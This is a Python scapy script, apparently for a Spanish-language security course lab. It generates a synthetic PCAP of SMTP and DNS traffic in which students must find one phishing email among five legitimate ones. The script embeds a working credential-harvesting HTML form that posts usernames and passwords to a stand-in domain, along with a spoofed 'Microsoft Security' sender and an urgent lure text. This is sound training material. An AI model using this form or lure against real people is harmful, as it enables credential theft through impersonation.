#!/usr/bin/env python3
"""
MAR404 - Clase 2 - Lab 3
Genera un PCAP con tráfico SMTP que incluye:
- 5 emails legítimos normales
- 1 email de phishing con adjunto HTML malicioso
- Tráfico DNS asociado a las resoluciones de dominios

El estudiante debe identificar el email de phishing analizando:
- Discrepancias en headers (MAIL FROM vs From)
- Dominio sospechoso (typosquatting)
- Adjunto codificado en Base64
- Correlación con DNS
"""

from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
import base64
import time
import random
import os

OUTPUT_FILE = "/pcap/smtp_phishing_lab.pcap"

# Configuración de red
MAIL_SERVER_IP = "10.0.1.10"
CLIENT_IP = "10.0.1.50"
ATTACKER_SMTP_IP = "198.51.100.23"
PHISHING_DOMAIN = "security-update-portal.com"
LEGIT_DOMAIN = "empresa-ejemplo.cl"
DNS_SERVER = "10.0.1.1"


def create_tcp_handshake(src_ip, dst_ip, sport, dport, seq_start):
    """Crea un handshake TCP de 3 vías."""
    syn = IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=dport, flags='S', seq=seq_start)
    syn_ack = IP(src=dst_ip, dst=src_ip) / TCP(sport=dport, dport=sport, flags='SA', seq=1000, ack=seq_start + 1)
    ack = IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=dport, flags='A', seq=seq_start + 1, ack=1001)
    return [syn, syn_ack, ack]


def create_smtp_session(src_ip, dst_ip, sport, mail_from, rcpt_to, subject, body, 
                        attachment=None, attachment_name=None, x_mailer="Thunderbird 115.0",
                        from_header=None, spf_result="pass"):
    """Genera una sesión SMTP completa como paquetes."""
    packets = []
    seq_c = random.randint(1000, 50000)
    seq_s = random.randint(1000, 50000)
    
    if from_header is None:
        from_header = mail_from
    
    # Banner del servidor
    banner = f"220 mail.{LEGIT_DOMAIN} ESMTP Postfix\r\n"
    packets.append(IP(src=dst_ip, dst=src_ip) / TCP(sport=25, dport=sport, flags='PA', seq=seq_s, ack=seq_c) / Raw(load=banner.encode()))
    seq_s += len(banner)
    
    # EHLO
    ehlo = f"EHLO {src_ip}\r\n"
    packets.append(IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=25, flags='PA', seq=seq_c, ack=seq_s) / Raw(load=ehlo.encode()))
    seq_c += len(ehlo)
    
    ehlo_resp = f"250-mail.{LEGIT_DOMAIN}\r\n250-SIZE 52428800\r\n250-AUTH LOGIN PLAIN\r\n250 OK\r\n"
    packets.append(IP(src=dst_ip, dst=src_ip) / TCP(sport=25, dport=sport, flags='PA', seq=seq_s, ack=seq_c) / Raw(load=ehlo_resp.encode()))
    seq_s += len(ehlo_resp)
    
    # MAIL FROM
    mail_from_cmd = f"MAIL FROM:<{mail_from}>\r\n"
    packets.append(IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=25, flags='PA', seq=seq_c, ack=seq_s) / Raw(load=mail_from_cmd.encode()))
    seq_c += len(mail_from_cmd)
    
    mail_from_resp = "250 2.1.0 Ok\r\n"
    packets.append(IP(src=dst_ip, dst=src_ip) / TCP(sport=25, dport=sport, flags='PA', seq=seq_s, ack=seq_c) / Raw(load=mail_from_resp.encode()))
    seq_s += len(mail_from_resp)
    
    # RCPT TO
    rcpt_cmd = f"RCPT TO:<{rcpt_to}>\r\n"
    packets.append(IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=25, flags='PA', seq=seq_c, ack=seq_s) / Raw(load=rcpt_cmd.encode()))
    seq_c += len(rcpt_cmd)
    
    rcpt_resp = "250 2.1.5 Ok\r\n"
    packets.append(IP(src=dst_ip, dst=src_ip) / TCP(sport=25, dport=sport, flags='PA', seq=seq_s, ack=seq_c) / Raw(load=rcpt_resp.encode()))
    seq_s += len(rcpt_resp)
    
    # DATA
    data_cmd = "DATA\r\n"
    packets.append(IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=25, flags='PA', seq=seq_c, ack=seq_s) / Raw(load=data_cmd.encode()))
    seq_c += len(data_cmd)
    
    data_resp = "354 End data with <CR><LF>.<CR><LF>\r\n"
    packets.append(IP(src=dst_ip, dst=src_ip) / TCP(sport=25, dport=sport, flags='PA', seq=seq_s, ack=seq_c) / Raw(load=data_resp.encode()))
    seq_s += len(data_resp)
    
    # Construir el email completo
    boundary = "----=_Part_12345_67890"
    
    email_headers = (
        f"From: {from_header}\r\n"
        f"To: {rcpt_to}\r\n"
        f"Subject: {subject}\r\n"
        f"Date: Thu, 03 Jul 2026 08:30:00 -0400\r\n"
        f"Message-ID: <{random.randint(100000,999999)}@{src_ip}>\r\n"
        f"X-Mailer: {x_mailer}\r\n"
        f"Received: from {src_ip} by mail.{LEGIT_DOMAIN}; Thu, 03 Jul 2026 08:30:00 -0400\r\n"
        f"Authentication-Results: mail.{LEGIT_DOMAIN}; spf={spf_result}\r\n"
        f"MIME-Version: 1.0\r\n"
    )
    
    if attachment:
        email_headers += f'Content-Type: multipart/mixed; boundary="{boundary}"\r\n\r\n'
        email_body = (
            f"--{boundary}\r\n"
            f"Content-Type: text/plain; charset=utf-8\r\n"
            f"Content-Transfer-Encoding: 7bit\r\n\r\n"
            f"{body}\r\n\r\n"
            f"--{boundary}\r\n"
            f"Content-Type: application/octet-stream; name=\"{attachment_name}\"\r\n"
            f"Content-Transfer-Encoding: base64\r\n"
            f"Content-Disposition: attachment; filename=\"{attachment_name}\"\r\n\r\n"
            f"{base64.b64encode(attachment.encode()).decode()}\r\n"
            f"--{boundary}--\r\n"
        )
    else:
        email_headers += "Content-Type: text/plain; charset=utf-8\r\n\r\n"
        email_body = f"{body}\r\n"
    
    email_data = email_headers + email_body + ".\r\n"
    
    # Enviar email en chunks
    chunk_size = 1400
    for i in range(0, len(email_data), chunk_size):
        chunk = email_data[i:i+chunk_size]
        packets.append(IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=25, flags='PA', seq=seq_c, ack=seq_s) / Raw(load=chunk.encode()))
        seq_c += len(chunk)
    
    # Respuesta OK
    ok_resp = "250 2.0.0 Ok: queued\r\n"
    packets.append(IP(src=dst_ip, dst=src_ip) / TCP(sport=25, dport=sport, flags='PA', seq=seq_s, ack=seq_c) / Raw(load=ok_resp.encode()))
    seq_s += len(ok_resp)
    
    # QUIT
    quit_cmd = "QUIT\r\n"
    packets.append(IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=25, flags='PA', seq=seq_c, ack=seq_s) / Raw(load=quit_cmd.encode()))
    
    return packets


def create_dns_query(client_ip, dns_server, domain, qtype="A"):
    """Crea un par query/response DNS."""
    query = IP(src=client_ip, dst=dns_server) / UDP(sport=random.randint(49152, 65535), dport=53) / \
            DNS(rd=1, qd=DNSQR(qname=domain, qtype=qtype))
    
    if domain == PHISHING_DOMAIN:
        response_ip = ATTACKER_SMTP_IP
    else:
        response_ip = MAIL_SERVER_IP
    
    response = IP(src=dns_server, dst=client_ip) / UDP(sport=53, dport=query[UDP].sport) / \
               DNS(id=query[DNS].id, qr=1, aa=1, qd=DNSQR(qname=domain, qtype=qtype),
                   an=DNSRR(rrname=domain, type="A", rdata=response_ip, ttl=300))
    
    return [query, response]


def generate_pcap():
    """Genera el PCAP completo del laboratorio."""
    all_packets = []
    
    # --- DNS Queries previas ---
    print("[+] Generando consultas DNS...")
    all_packets.extend(create_dns_query(CLIENT_IP, DNS_SERVER, f"mail.{LEGIT_DOMAIN}"))
    all_packets.extend(create_dns_query(CLIENT_IP, DNS_SERVER, PHISHING_DOMAIN))
    all_packets.extend(create_dns_query(CLIENT_IP, DNS_SERVER, "outlook.office365.com"))
    
    # --- Emails legítimos ---
    print("[+] Generando emails legítimos...")
    
    legit_emails = [
        {
            "mail_from": f"rrhh@{LEGIT_DOMAIN}",
            "rcpt_to": f"carlos.mendez@{LEGIT_DOMAIN}",
            "subject": "Recordatorio: Reunion de equipo manana 10:00",
            "body": "Hola Carlos,\n\nRecuerda que manana tenemos reunion de equipo a las 10:00 en sala 3.\n\nSaludos,\nRRHH",
            "sport": 49201,
            "src_ip": MAIL_SERVER_IP,
        },
        {
            "mail_from": f"soporte@{LEGIT_DOMAIN}",
            "rcpt_to": f"maria.gonzalez@{LEGIT_DOMAIN}",
            "subject": "Ticket #4521 - Resuelto",
            "body": "Estimada Maria,\n\nSu ticket de soporte #4521 ha sido resuelto. Por favor confirme.\n\nSoporte TI",
            "sport": 49202,
            "src_ip": MAIL_SERVER_IP,
        },
        {
            "mail_from": f"newsletter@updates.{LEGIT_DOMAIN}",
            "rcpt_to": f"all-staff@{LEGIT_DOMAIN}",
            "subject": "Boletin semanal - Semana 27",
            "body": "Boletin interno semanal.\n\n- Nuevo proyecto aprobado\n- Capacitacion de seguridad el viernes\n- Cumpleanos: Pedro (Contabilidad)",
            "sport": 49203,
            "src_ip": MAIL_SERVER_IP,
        },
        {
            "mail_from": f"gerencia@{LEGIT_DOMAIN}",
            "rcpt_to": f"jefes-area@{LEGIT_DOMAIN}",
            "subject": "Presupuesto Q3 - Revision",
            "body": "Estimados jefes de area,\n\nAdjunto el presupuesto Q3 para revision. Favor enviar comentarios antes del viernes.\n\nGerencia General",
            "sport": 49204,
            "src_ip": MAIL_SERVER_IP,
        },
        {
            "mail_from": f"proveedor@servicios-cloud.com",
            "rcpt_to": f"compras@{LEGIT_DOMAIN}",
            "subject": "Factura #8834 - Servicios Cloud Julio 2026",
            "body": "Estimado departamento de compras,\n\nAdjuntamos factura por servicios cloud del mes de julio.\n\nAtentamente,\nServicios Cloud SpA",
            "sport": 49205,
            "src_ip": MAIL_SERVER_IP,
        },
    ]
    
    for email in legit_emails:
        session = create_smtp_session(
            src_ip=email["src_ip"],
            dst_ip=CLIENT_IP,
            sport=email["sport"],
            mail_from=email["mail_from"],
            rcpt_to=email["rcpt_to"],
            subject=email["subject"],
            body=email["body"]
        )
        all_packets.extend(session)
    
    # --- Email de PHISHING ---
    print("[+] Generando email de phishing...")
    
    # Adjunto HTML malicioso (formulario de credenciales)
    phishing_html = """<!DOCTYPE html>
<html>
<head><title>Security Update Required</title></head>
<body style="font-family: Arial; text-align: center; padding: 50px;">
<img src="https://security-update-portal.com/logo.png" width="200">
<h2>Your account requires immediate verification</h2>
<p>Due to a recent security incident, please verify your credentials:</p>
<form action="https://security-update-portal.com/collect.php" method="POST">
<input type="text" name="username" placeholder="Email"><br><br>
<input type="password" name="password" placeholder="Password"><br><br>
<input type="submit" value="Verify Now">
</form>
<p style="font-size:10px; color:gray;">Microsoft Corporation 2026. All rights reserved.</p>
</body>
</html>"""
    
    phishing_session = create_smtp_session(
        src_ip=ATTACKER_SMTP_IP,
        dst_ip=CLIENT_IP,
        sport=49210,
        mail_from=f"noreply@{PHISHING_DOMAIN}",
        rcpt_to=f"carlos.mendez@{LEGIT_DOMAIN}",
        subject="[URGENTE] Verificacion de seguridad requerida - Accion inmediata",
        body="Estimado usuario,\n\nHemos detectado actividad sospechosa en su cuenta. "
             "Por favor abra el archivo adjunto para verificar su identidad.\n\n"
             "Este es un mensaje automatico del equipo de seguridad.\n\nMicrosoft Security Team",
        attachment=phishing_html,
        attachment_name="invoice_update.html",
        from_header="Microsoft Security <security@microsoft.com>",
        x_mailer="PHPMailer 6.5.0",
        spf_result="fail"
    )
    all_packets.extend(phishing_session)
    
    # --- DNS adicional post-phishing (simulando que el usuario hizo clic) ---
    print("[+] Generando DNS post-clic...")
    all_packets.extend(create_dns_query(CLIENT_IP, DNS_SERVER, PHISHING_DOMAIN))
    
    # Guardar PCAP
    print(f"[+] Guardando PCAP en {OUTPUT_FILE}...")
    os.makedirs(os.path.dirname(OUTPUT_FILE), exist_ok=True)
    wrpcap(OUTPUT_FILE, all_packets)
    print(f"[+] PCAP generado exitosamente: {len(all_packets)} paquetes")
    print("[+] Lab 3 listo para análisis")


if __name__ == "__main__":
    generate_pcap()
